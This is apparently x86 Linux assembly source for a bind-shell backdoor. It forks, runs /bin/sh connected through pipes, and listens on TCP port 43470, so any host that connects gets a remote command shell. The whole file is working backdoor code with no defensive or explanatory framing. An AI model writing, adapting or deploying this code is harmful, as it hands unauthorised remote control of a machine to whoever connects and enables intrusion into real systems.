  ;stack model
  ;
  ;.ebp-8    .ebp-6      .ebp-4     .ebp-2     .ebp
  ;=============================================
  ;| sh_read | net_write | net_read | sh_write |
  ;=============================================
  ;^esp      ^esp+2      ^esp+4     ^esp+6     ^esp+8
  ;

	mov ebp,esp

	;pipe(ebp-4)
	push dword 0
	mov eax,42
	mov ebx,esp
	int 0x80

	;pipe(ebp-8)
	push dword 0
	mov eax,42
	add ebx,esp
	int 0x80

	;fork()
	mov eax,2
	int 0x80
	cmp eax,0
	jne __listener

__shell:
	;connect sh_read end of pipe to stdin
	;dup(sh_read)
	mov eax,41
	xor ebx,ebx
	mov bx,word[ebp-8]
	int 0x80
	mov word[ebp-8],ax

	;close(net_write)
	mov eax,6
	xor ebx,ebx
	mov bx,word[ebp-6]
	int 0x80

	;connect sh_write end of pipe to stdout
	;dup(sh_write)
	mov eax,41
	xor ebx,ebx
	mov bx,word[ebp-2]
	int 0x80
	mov word[ebp-2],ax

	;close(net_read)
	mov eax,6
	xor ebx,ebx
	mov bx,word[ebp-4]
	int 0x80

	;exec shell
	mov eax,11
	jmp __SH__
  X__SH__:
	pop ebx
	push dword 0
	push ebx
	mov ecx,esp
	xor edx,edx
	int 0x80

	;strings
  __SH__:
	call X__SH__
	db "/bin/sh",0

__listener:
	cmp eax,0
	jl __exit_bdoor

	;connect net_read end of pipe to stdin
	;dup(net_read)
	mov eax,41
	xor ebx,ebx
	mov bx,word[ebp-4]
	int 0x80
	mov word[ebp-4],ax

	;close(sh_write)
	mov eax,6
	xor ebx,ebx
	mov bx,word[ebp-2]
	int 0x80

	;connect net_write end of pipe to stdout
	;dup(net_write)
	mov eax,41
	xor ebx,ebx
	mov bx,word[ebp-6]
	int 0x80
	mov word[ebp-6],ax

	;close(sh_read)
	mov eax,6
	xor ebx,ebx
	mov bx,word[ebp-8]
	int 0x80

	;%esi = socket(af_inet,sock_stream,tcp)
	push dword 6
	push dword 1
	push dword 2
	call _socket
	mov esi,eax

	;bind(%esi,&{af_inet,*:43470,zero},16)
	push dword 0
	push dword 0
	push dword 0
	push word 0xcea9
	push word 2
	mov edi,esp
	push dword 16
	push edi
	push esi
	call _bind

	;listen(%esi,1)
	push byte 1
	push esi
	call _listen

	;making space on stack
	sub esp,512

  __new_connect:
	;%edi = accept(%esi,NULL,NULL)
	push dword 0
	push dword 0
	push esi
	call _accept
	mov edi,eax

	;%ecx = %esp for all ops
	mov ecx,esp

	;read from socket
	;read(%edi,%esp,512)
	mov eax,3
	mov ebx,edi
	mov edx,512
	int 0x80
	mov edx,eax
	and edx,0x1FF

	;write to pipe
	;write(net_write,%esp,%edx)
	mov eax,4
	xor ebx,ebx
	mov bx,word[ebp-6]
	int 0x80

	;read from pipe
	;read(net_read,%esp,512)
	mov eax,3
	xor ebx,ebx
	mov bx,word[ebp-4]
	mov edx,512
	int 0x80
	mov edx,eax
	and edx,0x1FF

	;write to socket
	;write(%edi,%esp,%edx)
	mov eax,4
	mov ebx,edi
	int 0x80

	jmp __new_connect

__exit_bdoor:
	nop
